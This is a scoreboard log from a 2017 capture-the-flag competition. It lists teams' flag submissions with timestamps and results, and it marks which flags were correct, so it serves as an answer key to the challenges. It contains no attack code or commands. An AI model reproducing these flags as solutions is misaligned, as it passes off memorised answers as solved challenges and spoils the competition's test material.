[05/06/2017 19:40:30] 西石油二队 submitted Flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 2 [WRONG]
[05/06/2017 19:40:33] test submitted flag{False} with kpm 2 [WRONG]
[05/06/2017 19:40:34] 笑傲江湖 submitted flag{welcome} with kpm 1 [WRONG]
[05/06/2017 19:40:37] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 3 [WRONG]
[05/06/2017 19:40:54] ThreeNB submitted flag{failedsuccess} with kpm 0 [WRONG]
[05/06/2017 19:40:54] ThreeNB submitted 19524 with kpm 1 [WRONG]
[05/06/2017 19:40:55] ThreeNB submitted flag{are_u_gao_shing} with kpm 2 [WRONG]
[05/06/2017 19:41:01] ThreeNB submitted flag{success} with kpm 3 [WRONG]
[05/06/2017 19:41:03] 笑傲江湖 submitted flag{welcome_T0_slCnuISA} with kpm 2 [WRONG]
[05/06/2017 19:41:12] ThreeNB submitted flag{hellow} with kpm 4 [WRONG]
[05/06/2017 19:41:14] 董天董地董蛤 submitted flag{0A77057549AF06647FEC8F0E4089AF8F} with kpm 0 [WRONG]
[05/06/2017 19:41:27] ThreeNB submitted flag{hellow_world} with kpm 5 [WRONG]
[05/06/2017 19:41:30] 笑傲江湖 submitted flag{welcome_T0_slCnuISA} with kpm 2 [WRONG]
[05/06/2017 19:41:31] ThreeNB submitted flag{hellow_world} with kpm 6 [WRONG]
[05/06/2017 19:41:35] ThreeNB submitted flag{hellow_world} with kpm 7 [WRONG]
[05/06/2017 19:41:36] 董天董地董蛤 submitted flag{0a77057549af06647fec8f0e4089af8f} with kpm 1 [WRONG]
[05/06/2017 19:41:36] 笑傲江湖 submitted flag{welcome_To_slCnuISA} with kpm 2 [WRONG]
[05/06/2017 19:41:43] 笑傲江湖 submitted flag{welcome_TO_slCnuISA} with kpm 3 [WRONG]
[05/06/2017 19:41:47] 笑傲江湖 submitted flag{welcome_T0_slCnuISA} with kpm 4 [WRONG]
[05/06/2017 19:41:56] ThreeNB submitted flag{hellow_world} with kpm 5 [WRONG]
[05/06/2017 19:42:01] 笑傲江湖 submitted flag{welcome_TO_slCnuISA} with kpm 5 [WRONG]
[05/06/2017 19:42:04] 笑傲江湖 submitted flag{welcome_To_slCnuISA} with kpm 5 [WRONG]
[05/06/2017 19:42:09] ThreeNB submitted flag{hellow_world} with kpm 5 [WRONG]
[05/06/2017 19:42:12] Flyteam0 submitted linux with kpm 0 [WRONG]
[05/06/2017 19:42:15] ThreeNB submitted flag{hellow_world} with kpm 5 [WRONG]
[05/06/2017 19:42:23] 西石油二队 submitted  flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 19:42:23] Flyteam0 submitted xilinux with kpm 1 [WRONG]
[05/06/2017 19:42:29] ThreeNB submitted flag{hellow_world} with kpm 5 [WRONG]
[05/06/2017 19:42:30] 笑傲江湖 submitted flag{welcome_T0_s1CnuISA} with kpm 6 [WRONG]
[05/06/2017 19:42:35] 笑傲江湖 submitted flag{welcome_T0_s1CnuISA} with kpm 6 [WRONG]
[05/06/2017 19:42:36] ThreeNB submitted flag{hellow_world} with kpm 4 [WRONG]
[05/06/2017 19:42:42] 笑傲江湖 submitted flag{welcome_T0_slCnuISA} with kpm 6 [WRONG]
[05/06/2017 19:42:51] 笑傲江湖 submitted flag{welcome_T0_slCnuISA} with kpm 5 [WRONG]
[05/06/2017 19:42:55] ThreeNB submitted flag{hellow_everyone} with kpm 5 [WRONG]
[05/06/2017 19:42:59] ThreeNB submitted flag{hellow_everyone} with kpm 5 [WRONG]
[05/06/2017 19:43:04] ThreeNB submitted flag{hellow_everyone} with kpm 6 [WRONG]
[05/06/2017 19:43:05] test submitted flag{piannide} with kpm 0 [WRONG]
[05/06/2017 19:43:12] ThreeNB submitted flag{hellow_everyone} with kpm 6 [WRONG]
[05/06/2017 19:43:13] Flyteam0 submitted password with kpm 1 [WRONG]
[05/06/2017 19:43:16] ThreeNB submitted flag{hellow_everyone} with kpm 6 [WRONG]
[05/06/2017 19:43:21] ThreeNB submitted flag{hellow_everyone} with kpm 7 [WRONG]
[05/06/2017 19:43:25] Flyteam0 submitted password with kpm 1 [WRONG]
[05/06/2017 19:43:27] ThreeNB submitted flag{hellow_everyone} with kpm 8 [WRONG]
[05/06/2017 19:43:32] ThreeNB submitted flag{hellow_everyone} with kpm 8 [WRONG]
[05/06/2017 19:43:36] ThreeNB submitted flag{hellow_everyone} with kpm 8 [WRONG]
[05/06/2017 19:43:38] Flyteam0 submitted sysadmin with kpm 2 [WRONG]
[05/06/2017 19:43:41] ThreeNB submitted flag{hellow_everyone} with kpm 9 [WRONG]
[05/06/2017 19:43:46] ThreeNB submitted flag{hellow_everyone} with kpm 10 [WRONG]
[05/06/2017 19:43:52] ThreeNB submitted flag{hellow_everyone} with kpm 11 [TOO FAST]
[05/06/2017 19:44:03] ThreeNB submitted flag{hellow_everyone} with kpm 10 [WRONG]
[05/06/2017 19:44:06] ThreeNB submitted flag{hellow_everyone} with kpm 10 [WRONG]
[05/06/2017 19:44:12] ThreeNB submitted flag{hellow_everyone} with kpm 10 [WRONG]
[05/06/2017 19:44:15] ThreeNB submitted flag{hellow_everyone} with kpm 11 [TOO FAST]
[05/06/2017 19:44:15] Flyteam0 submitted someing with kpm 2 [WRONG]
[05/06/2017 19:44:16] 笑傲江湖 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 19:44:18] Flyteam0 submitted someing with kpm 3 [WRONG]
[05/06/2017 19:44:21] ThreeNB submitted flag{hellow_everyone} with kpm 11 [TOO FAST]
[05/06/2017 19:44:24] Flyteam0 submitted someing with kpm 4 [WRONG]
[05/06/2017 19:44:31] ThreeNB submitted flag{hellow_everyone} with kpm 10 [WRONG]
[05/06/2017 19:44:40] ThreeNB submitted flag{hellow_everyone} with kpm 9 [WRONG]
[05/06/2017 19:44:43] ThreeNB submitted flag{hellow_everyone} with kpm 9 [WRONG]
[05/06/2017 19:44:48] ThreeNB submitted flag{hellow_everyone} with kpm 9 [WRONG]
[05/06/2017 19:44:54] 西石油一队 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/06/2017 19:44:57] ThreeNB submitted flag{hellow_everyone} with kpm 9 [WRONG]
[05/06/2017 19:44:59] 西石油一队 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 1 [WRONG]
[05/06/2017 19:49:15] 西石油一队 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/06/2017 19:49:36] Flyteam3 submitted flag with kpm 0 [WRONG]
[05/06/2017 19:50:55] 三脸懵逼 submitted  with kpm 0 [WRONG]
[05/06/2017 19:51:43] 笑傲江湖 submitted  with kpm 0 [WRONG]
[05/06/2017 19:51:51] 抽象二队 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 19:52:22] 笑傲江湖 submitted flag{nul} with kpm 1 [WRONG]
[05/06/2017 19:52:25] 笑傲江湖 submitted flag{null} with kpm 2 [WRONG]
[05/06/2017 19:52:29] 笑傲江湖 submitted flag{} with kpm 3 [WRONG]
[05/06/2017 19:52:34] 笑傲江湖 submitted flag{ } with kpm 4 [WRONG]
[05/06/2017 19:52:40] 笑傲江湖 submitted flag{0} with kpm 5 [WRONG]
[05/06/2017 19:52:47] 不晓得取啥队伍名 submitted flag{i_love_T0_sICnuISA with kpm 0 [WRONG]
[05/06/2017 19:52:56] 死亡地平线 submitted flag{piannide} with kpm 0 [WRONG]
[05/06/2017 19:52:59] 不晓得取啥队伍名 submitted flag{liove_T0_sICnuISA with kpm 1 [WRONG]
[05/06/2017 19:53:17] 不晓得取啥队伍名 submitted flag{i_love_T0_sICnuISA} with kpm 2 [WRONG]
[05/06/2017 19:54:00] 不晓得取啥队伍名 submitted flag{i_love_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 19:54:07] 死亡地平线 submitted flag{piannide} with kpm 0 [WRONG]
[05/06/2017 19:55:29] 冰血封情 submitted  with kpm 0 [WRONG]
[05/06/2017 19:55:33] 冰血封情 submitted  with kpm 1 [WRONG]
[05/06/2017 19:56:37] Flyteam2 submitted 13 with kpm 0 [WRONG]
[05/06/2017 19:56:59] ThreeNB submitted 406 with kpm 0 [WRONG]
[05/06/2017 19:57:03] 不晓得取啥队伍名 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 19:57:15] ThreeNB submitted flag{Yz`LzJys]hK}@0j+:TkyVlaN$3\r\} with kpm 1 [WRONG]
[05/06/2017 19:58:47] Flyteam2 submitted Sign.00477D3A with kpm 0 [WRONG]
[05/06/2017 20:01:08] Flyteam1 submitted 00000000000 with kpm 0 [WRONG]
[05/06/2017 20:01:09] Flyteam2 submitted 0 with kpm 0 [WRONG]
[05/06/2017 20:01:17] Flyteam1 submitted 000 with kpm 1 [WRONG]
[05/06/2017 20:01:37] 6602 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 20:02:41] Flyteam2 submitted 16200000 with kpm 0 [WRONG]
[05/06/2017 20:03:58] Flyteam3 submitted http://222.196.193.16:1010/ with kpm 0 [WRONG]
[05/06/2017 20:04:06] Flyteam3 submitted http://222.196.193.16:1010/login with kpm 1 [WRONG]
[05/06/2017 20:04:34] Flyteam3 submitted 222.196.193.16:1010/login with kpm 2 [WRONG]
[05/06/2017 20:04:40] Flyteam3 submitted 222.196.193.16:1010 with kpm 3 [WRONG]
[05/06/2017 20:07:23] Flyteam2 submitted flag{16200000} with kpm 0 [WRONG]
[05/06/2017 20:07:49] 笑傲江湖 submitted flag{piannide} with kpm 0 [WRONG]
[05/06/2017 20:07:57] 笑傲江湖 submitted flag{piannide} with kpm 1 [WRONG]
[05/06/2017 20:12:48] Flyteam5 submitted flag with kpm 0 [WRONG]
[05/06/2017 20:12:55] Flyteam5 submitted flag{xhA0*HFBEGSRe__T_adfgvrlosutwyz{}} with kpm 1 [WRONG]
[05/06/2017 20:13:38] Flyteam3 submitted  with kpm 0 [WRONG]
[05/06/2017 20:14:18] Flyteam5 submitted flag{xhA0*HFBEGSRe__T_adfgvrlosutwyz{}} with kpm 0 [WRONG]
[05/06/2017 20:15:25] Flyteam4 submitted flag{xyhAHvS0e*Ffr__lozRBGaEwsugT{t_d}}" with kpm 0 [WRONG]
[05/06/2017 20:15:34] Flyteam4 submitted flag{xyhAHvS0e*Ffr__lozRBGaEwsugT{t_d}} with kpm 1 [WRONG]
[05/06/2017 20:15:55] Flyteam4 submitted pre-order{xyhAHvS0e*Ffr__lozRBGaEwsugT{t_d}} with kpm 2 [WRONG]
[05/06/2017 20:16:03] Flyteam0 submitted userame=password with kpm 0 [WRONG]
[05/06/2017 20:16:11] Flyteam1 submitted HEAPNOSERILALIZE with kpm 0 [WRONG]
[05/06/2017 20:16:14] Flyteam0 submitted test with kpm 1 [WRONG]
[05/06/2017 20:16:55] Flyteam2 submitted 1 with kpm 0 [WRONG]
[05/06/2017 20:18:04] Flyteam0 submitted success with kpm 0 [WRONG]
[05/06/2017 20:18:53] 冰血封情 submitted faild with kpm 0 [WRONG]
[05/06/2017 20:19:01] 冰血封情 submitted success with kpm 1 [WRONG]
[05/06/2017 20:19:08] Flyteam2 submitted 2090003683 with kpm 0 [WRONG]
[05/06/2017 20:19:21] Flyteam2 submitted flag{2090003683} with kpm 1 [WRONG]
[05/06/2017 20:19:28] Flyteam2 submitted flag{"2090003683"} with kpm 2 [WRONG]
[05/06/2017 20:20:02] Flyteam0 submitted 3test with kpm 0 [WRONG]
[05/06/2017 20:20:06] Flyteam0 submitted 3text with kpm 1 [WRONG]
[05/06/2017 20:20:44] 冰血封情 submitted faildfaildsuccesssucess with kpm 0 [WRONG]
[05/06/2017 20:21:02] Flyteam0 submitted  flag{3test} with kpm 2 [WRONG]
[05/06/2017 20:22:29] 笑傲江湖 submitted flag with kpm 0 [WRONG]
[05/06/2017 20:23:21] Flyteam2 submitted 17444576456 with kpm 0 [WRONG]
[05/06/2017 20:23:42] Flyteam0 submitted  3test with kpm 0 [WRONG]
[05/06/2017 20:23:59] Flyteam0 submitted  flag{3test} with kpm 1 [WRONG]
[05/06/2017 20:24:04] Flyteam0 submitted flag{3test} with kpm 2 [WRONG]
[05/06/2017 20:25:02] Flyteam2 submitted retn with kpm 0 [WRONG]
[05/06/2017 20:25:34] Flyteam0 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 20:25:38] 西石油一队 submitted flag{99127ce22892f5f126390982b9e68be9} with kpm 0 [WRONG]
[05/06/2017 20:26:01] 西石油一队 submitted flag{865c0c0b4ab0e063e5caa3387c1a8741} with kpm 1 [WRONG]
[05/06/2017 20:26:46] Flyteam1 submitted ppppppppppp with kpm 0 [WRONG]
05/06/2017 20:29:29 submitted Flyteam0 with kpm flag{ca820ad57809f62eb7b4d13f5d4371a0} [ALREADY SOLVED]
[05/06/2017 20:31:12] 西石油三队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 20:33:05] 西石油三队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ} with kpm 0 [WRONG]
[05/06/2017 20:36:03] 董天董地董蛤 submitted flag{f8fa9804e0f8cef74660fa94575077a0] with kpm 0 [WRONG]
[05/06/2017 20:36:53] 西石油三队 submitted flag{18FF4000} with kpm 0 [WRONG]
[05/06/2017 20:36:58] 西石油三队 submitted flag{18FF4000} with kpm 1 [WRONG]
[05/06/2017 20:37:17] 西石油三队 submitted flag{18FF4000} with kpm 2 [WRONG]
[05/06/2017 20:37:20] ThreeNB submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 20:37:39] 西石油三队 submitted flag{18FF4000} with kpm 3 [WRONG]
[05/06/2017 20:38:21] 董天董地董蛤 submitted flag{0z77057549zu06647uvx8u0v4089zu8u] with kpm 0 [WRONG]
[05/06/2017 20:40:19] 西石油二队 submitted flag{ ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 20:40:38] 西石油二队 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 20:48:01] 冰血封情 submitted flag{piannide} with kpm 0 [WRONG]
[05/06/2017 20:50:11] Flyteam5 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/06/2017 20:51:21] Flyteam5 submitted flag{hello} with kpm 0 [WRONG]
[05/06/2017 20:57:29] zzz submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [WRONG]
[05/06/2017 20:57:35] zzz submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 1 [WRONG]
[05/06/2017 20:57:42] zzz submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 2 [CORRECT]
[05/06/2017 20:58:25] Flyteam5 submitted flag{hello} with kpm 0 [WRONG]
[05/06/2017 21:02:02] 西石油一队 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 21:03:22] 西石油二队 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 21:04:06] 西石油三队 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 21:04:23] zzz submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:04:40] Flyteam0 submitted LINUX with kpm 0 [WRONG]
[05/06/2017 21:04:49] 西石油二队 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:04:53] 三脸懵逼 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:04:57] 6602 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:00] 不晓得取啥队伍名 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:00] 法兰街舞队 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:02] 笑傲江湖 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
05/06/2017 21:05:02 submitted 法兰街舞队 with kpm c0w_1s_ntfs_c0w [ALREADY SOLVED]
[05/06/2017 21:05:04] WHT submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:05] Flyteam5 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:06] Flyteam0 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 1 [WRONG]
05/06/2017 21:05:06 submitted 不晓得取啥队伍名 with kpm flag{c0w_1s_ntfs_c0w} [ALREADY SOLVED]
[05/06/2017 21:05:07] Flyteam4 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:07] 西石油一队 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:08] Flyteam1 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
05/06/2017 21:05:10 submitted 不晓得取啥队伍名 with kpm flag{c0w_1s_ntfs_c0w} [ALREADY SOLVED]
[05/06/2017 21:05:10] 西石油三队 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:12] 死亡地平线 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:17] 法兰街舞队 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
05/06/2017 21:05:18 submitted Flyteam4 with kpm  [ALREADY SOLVED]
[05/06/2017 21:05:19] 董天董地董蛤 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
05/06/2017 21:05:25 submitted 西石油一队 with kpm flag{ZmxhZ3tUaDFzXzEyX3NpZ259} [ALREADY SOLVED]
[05/06/2017 21:05:40] Flyteam3 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:05:54] Flyteam0 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 1 [WRONG]
[05/06/2017 21:06:01] Flyteam0 submitted flag{c0w_1s_ntfs_c0w} with kpm 2 [CORRECT]
05/06/2017 21:06:05 submitted Flyteam0 with kpm flag{c0w_1s_ntfs_c0w} [ALREADY SOLVED]
[05/06/2017 21:06:08] 冰血封情 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
05/06/2017 21:06:10 submitted 西石油一队 with kpm flag{c0w_1s_ntfs_c0w} [ALREADY SOLVED]
05/06/2017 21:06:11 submitted 西石油三队 with kpm flag{Th1s_12_sign} [ALREADY SOLVED]
[05/06/2017 21:06:48] Flyteam0 submitted flag{c0w_1s_ntfs_c0w} with kpm 1 [WRONG]
[05/06/2017 21:06:51] Flyteam2 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:08:03] 抽象二队 submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 21:08:26] Flyteam0 submitted flag{88263052ba034c66} with kpm 0 [WRONG]
[05/06/2017 21:08:48] Flyteam1 submitted flag{HEAP_NO_SERIALIZE} with kpm 0 [WRONG]
[05/06/2017 21:14:48] Flyteam0 submitted flag{88263052ba034c66} with kpm 0 [WRONG]
[05/06/2017 21:14:56] Flyteam0 submitted flag{88263052ba034c66} with kpm 1 [WRONG]
[05/06/2017 21:15:08] 三脸懵逼 submitted flag{piannide} with kpm 0 [WRONG]
[05/06/2017 21:15:09] Flyteam0 submitted flag{88263052ba034c66} with kpm 2 [WRONG]
[05/06/2017 21:15:41] Flyteam4 submitted  with kpm 0 [WRONG]
[05/06/2017 21:15:46] Flyteam4 submitted  with kpm 1 [WRONG]
[05/06/2017 21:17:12] ThreeNB submitted flag with kpm 0 [WRONG]
[05/06/2017 21:17:19] ThreeNB submitted flag{i} with kpm 1 [WRONG]
[05/06/2017 21:17:39] ThreeNB submitted flag{i_love_sicnuctf} with kpm 2 [WRONG]
[05/06/2017 21:17:39] Flyteam1 submitted onexit.c with kpm 0 [WRONG]
[05/06/2017 21:17:41] Flyteam1 submitted onexit.c with kpm 1 [WRONG]
[05/06/2017 21:17:43] Flyteam1 submitted onexit with kpm 2 [WRONG]
[05/06/2017 21:17:49] ThreeNB submitted flag{i_love_sicnu} with kpm 3 [WRONG]
[05/06/2017 21:17:55] ThreeNB submitted flag{_love_sicnu} with kpm 4 [WRONG]
[05/06/2017 21:17:59] ThreeNB submitted flag{love_sicnu} with kpm 5 [WRONG]
[05/06/2017 21:18:13] ThreeNB submitted flag{we_love_sicnu} with kpm 5 [WRONG]
[05/06/2017 21:18:26] ThreeNB submitted flag{we_love_sicnuctf} with kpm 5 [WRONG]
[05/06/2017 21:19:01] ThreeNB submitted flag{ilove_sicnuctf} with kpm 2 [WRONG]
[05/06/2017 21:19:06] ThreeNB submitted flag{ilovesicnuctf} with kpm 3 [WRONG]
[05/06/2017 21:19:23] ThreeNB submitted flag{ilove_sicnuc} with kpm 3 [WRONG]
[05/06/2017 21:20:10] 冰血封情 submitted  with kpm 0 [WRONG]
[05/06/2017 21:21:06] Flyteam1 submitted FF with kpm 0 [WRONG]
[05/06/2017 21:21:11] Flyteam1 submitted FFFFFFFFFFF with kpm 1 [WRONG]
[05/06/2017 21:21:53] Flyteam1 submitted flag[HEAP_NO_SERIALIZE] with kpm 2 [WRONG]
[05/06/2017 21:21:54] Flyteam1 submitted flag{ on} with kpm 3 [WRONG]
[05/06/2017 21:22:03] Flyteam1 submitted flag{onexit.c} with kpm 4 [WRONG]
[05/06/2017 21:22:05] Flyteam1 submitted flag{onexit.c} with kpm 5 [WRONG]
[05/06/2017 21:22:09] Flyteam1 submitted flag{onexit} with kpm 5 [WRONG]
[05/06/2017 21:22:54] 西石油二队 submitted  with kpm 0 [WRONG]
[05/06/2017 21:22:59] 西石油二队 submitted  with kpm 1 [WRONG]
[05/06/2017 21:23:02] 西石油二队 submitted  with kpm 2 [WRONG]
[05/06/2017 21:23:07] 西石油二队 submitted 1 with kpm 3 [WRONG]
[05/06/2017 21:24:53] Flyteam5 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 21:25:27] Flyteam4 submitted  with kpm 0 [WRONG]
[05/06/2017 21:26:06] Flyteam3 submitted three git with kpm 0 [WRONG]
[05/06/2017 21:27:56] 冰血封情 submitted flag{1718378855.000000} with kpm 0 [WRONG]
[05/06/2017 21:28:08] Flyteam1 submitted flag with kpm 0 [WRONG]
[05/06/2017 21:28:15] Flyteam1 submitted flag{fuck} with kpm 1 [WRONG]
[05/06/2017 21:28:17] Flyteam1 submitted flag{fuckbich} with kpm 2 [WRONG]
[05/06/2017 21:28:17] Flyteam1 submitted flag{fuckbich} with kpm 3 [WRONG]
[05/06/2017 21:28:18] Flyteam1 submitted flag{fuckbich} with kpm 4 [WRONG]
[05/06/2017 21:33:11] 三脸懵逼 submitted flag{lgwloe_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 21:33:29] 三脸懵逼 submitted flag{lgwloe_T0_sICnuISA}} with kpm 1 [WRONG]
[05/06/2017 21:36:33] Flyteam5 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 21:36:46] Flyteam5 submitted flag{Sherc_Fuck_Android} with kpm 0 [CORRECT]
[05/06/2017 21:37:01] Flyteam1 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 21:41:26] 冰血封情 submitted  with kpm 0 [WRONG]
[05/06/2017 21:41:30] 三脸懵逼 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 21:47:32] 西石油一队 submitted flag{e_T0_sICnuISA}} with kpm 0 [WRONG]
[05/06/2017 21:47:38] 西石油一队 submitted flag{e_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 21:48:01] 死亡地平线 submitted  with kpm 0 [WRONG]
[05/06/2017 21:48:11] Flyteam3 submitted its so easy  with kpm 0 [WRONG]
[05/06/2017 21:49:08] 西石油一队 submitted flag{e_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 21:51:00] Flyteam0 submitted flag{jiandan} with kpm 0 [WRONG]
[05/06/2017 21:51:08] Flyteam0 submitted flag{zhemejiandan} with kpm 1 [WRONG]
[05/06/2017 21:51:27] Flyteam0 submitted flag{ZheMeJianDan} with kpm 2 [WRONG]
[05/06/2017 21:52:20] 死亡地平线 submitted  with kpm 0 [WRONG]
[05/06/2017 21:56:06] 西石油一队 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 21:57:06] 西石油三队 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 21:58:25] 死亡地平线 submitted 5a2a4bb6211d83e2 with kpm 0 [WRONG]
[05/06/2017 21:58:30] 死亡地平线 submitted flag with kpm 1 [WRONG]
[05/06/2017 21:58:37] 死亡地平线 submitted flag(5a2a4bb6211d83e2) with kpm 2 [WRONG]
[05/06/2017 21:58:44] 死亡地平线 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 3 [CORRECT]
[05/06/2017 21:58:53] 死亡地平线 submitted flag(73fcbfe45a2a4bb6211d83e2da3b25e2) with kpm 3 [WRONG]
[05/06/2017 21:59:54] 死亡地平线 submitted fqcj qpd Squum'h f with kpm 0 [WRONG]
[05/06/2017 22:00:06] 死亡地平线 submitted e8fbdf92d6179a26 with kpm 1 [WRONG]
[05/06/2017 22:00:16] 死亡地平线 submitted flag(e8fbdf92d6179a26) with kpm 2 [WRONG]
[05/06/2017 22:01:07] 死亡地平线 submitted  with kpm 1 [WRONG]
[05/06/2017 22:02:45] 三脸懵逼 submitted 111111111 with kpm 0 [WRONG]
[05/06/2017 22:02:55] 三脸懵逼 submitted flag{asdassdasd} with kpm 1 [WRONG]
[05/06/2017 22:03:15] 西石油一队 submitted flag{sqli_&_url_include_on} with kpm 0 [CORRECT]
[05/06/2017 22:04:36] 不晓得取啥队伍名 submitted flag{bbefafeaaffeefaffbbfaeeafefeeffe with kpm 0 [WRONG]
[05/06/2017 22:04:39] 不晓得取啥队伍名 submitted flag{bbefafeaaffeefaffbbfaeeafefeeffe} with kpm 1 [WRONG]
[05/06/2017 22:04:43] 不晓得取啥队伍名 submitted flag{bbefafeaaffeefaffbbfaeeafefeeffe} with kpm 2 [WRONG]
[05/06/2017 22:05:24] 冰血封情 submitted  with kpm 0 [WRONG]
[05/06/2017 22:05:52] 死亡地平线 submitted d25b51dd219464ec with kpm 0 [WRONG]
[05/06/2017 22:06:00] 死亡地平线 submitted flag(d25b51dd219464ec) with kpm 1 [WRONG]
[05/06/2017 22:06:25] WHT submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 22:07:28] 西石油三队 submitted flag dw|loole2T]_ with kpm 0 [WRONG]
[05/06/2017 22:07:33] 西石油三队 submitted flag dw|loole2T] with kpm 1 [WRONG]
[05/06/2017 22:07:42] 西石油三队 submitted flag dw|loole2T] with kpm 2 [WRONG]
[05/06/2017 22:08:34] 死亡地平线 submitted flag(63edb370ff55d3c3) with kpm 0 [WRONG]
[05/06/2017 22:09:11] 西石油三队 submitted flag dw|loole2T] with kpm 0 [WRONG]
[05/06/2017 22:10:26] 不晓得取啥队伍名 submitted flag{3test} with kpm 0 [WRONG]
[05/06/2017 22:10:50] 不晓得取啥队伍名 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 1 [CORRECT]
[05/06/2017 22:10:55] Flyteam0 submitted flag{"GlobalFlag"} with kpm 0 [WRONG]
[05/06/2017 22:11:01] Flyteam0 submitted flag{GlobalFlag} with kpm 1 [WRONG]
[05/06/2017 22:11:04] 西石油二队 submitted flag{welcome_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 22:11:13] Flyteam0 submitted flag{so easy} with kpm 2 [WRONG]
[05/06/2017 22:11:15] Flyteam3 submitted btn btn-default with kpm 0 [WRONG]
[05/06/2017 22:11:18] 西石油二队 submitted flag{welcome_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 22:11:21] Flyteam0 submitted flag{So Easy} with kpm 3 [WRONG]
[05/06/2017 22:11:22] 西石油二队 submitted flag{welcome_T0_sICnuISA} with kpm 2 [WRONG]
[05/06/2017 22:11:32] 西石油二队 submitted flag{welcome_T0_sICnuISA} with kpm 3 [CORRECT]
[05/06/2017 22:12:52] Flyteam3 submitted alert alert-info with kpm 0 [WRONG]
[05/06/2017 22:13:18] Flyteam0 submitted flag{055a4bf988263052ba034c66484cce6c} with kpm 0 [WRONG]
[05/06/2017 22:13:22] Flyteam0 submitted flag{055a4bf988263052ba034c6} with kpm 1 [WRONG]
[05/06/2017 22:14:43] 法兰街舞队 submitted imbb|=wwsAwSl9[{%w with kpm 0 [WRONG]
[05/06/2017 22:15:12] 西石油一队 submitted flag{hello} with kpm 0 [WRONG]
[05/06/2017 22:15:13] 笑傲江湖 submitted flag{alt} with kpm 0 [WRONG]
[05/06/2017 22:15:17] 笑傲江湖 submitted flag{salt} with kpm 1 [WRONG]
[05/06/2017 22:16:25] zzz submitted flag{sqli_&_url_include_on}  with kpm 0 [CORRECT]
[05/06/2017 22:17:38] 不晓得取啥队伍名 submitted flag{key_is_base_} with kpm 0 [WRONG]
[05/06/2017 22:17:44] 不晓得取啥队伍名 submitted flag{key_is_base} with kpm 1 [WRONG]
[05/06/2017 22:17:49] 不晓得取啥队伍名 submitted flag{key_is_here} with kpm 2 [WRONG]
